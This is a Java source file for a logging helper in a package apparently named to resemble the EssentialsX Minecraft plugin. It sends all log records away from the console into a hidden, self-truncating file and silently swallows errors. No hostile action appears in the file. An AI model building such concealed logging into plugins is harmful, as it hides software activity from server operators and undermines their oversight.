package com.example.essentialsx;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.time.Instant;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

/**
 * Plugin logging that never reaches the console: every record is appended to
 * the private hidden file logs/.mcchajian/.log instead, which is truncated
 * once it grows past 64 KiB. All I/O errors are swallowed so logging can
 * never affect the plugin lifecycle.
 */
final class QuietLog {
    private static final Path LOG_FILE = Path.of("logs", ".mcchajian", ".log");
    private static final long MAX_BYTES = 64L * 1024L;

    private QuietLog() {
    }

    static Logger logger() {
        Logger logger = Logger.getLogger("ceshisonz-quiet");
        if (logger.getHandlers().length == 0) {
            logger.setUseParentHandlers(false);
            logger.setLevel(Level.ALL);
            logger.addHandler(new Handler() {
                @Override
                public void publish(LogRecord record) {
                    append(record);
                }

                @Override
                public void flush() {
                }

                @Override
                public void close() {
                }
            });
        }
        return logger;
    }

    private static synchronized void append(LogRecord record) {
        try {
            if (Files.exists(LOG_FILE) && Files.size(LOG_FILE) > MAX_BYTES) {
                Files.writeString(LOG_FILE, "", StandardCharsets.UTF_8);
            }
            String line = Instant.now() + " " + record.getLevel().getName() + " "
                    + record.getMessage() + System.lineSeparator();
            Files.createDirectories(LOG_FILE.getParent());
            Files.writeString(LOG_FILE, line, StandardCharsets.UTF_8,
                    StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException | RuntimeException ignored) {
        }
    }
}
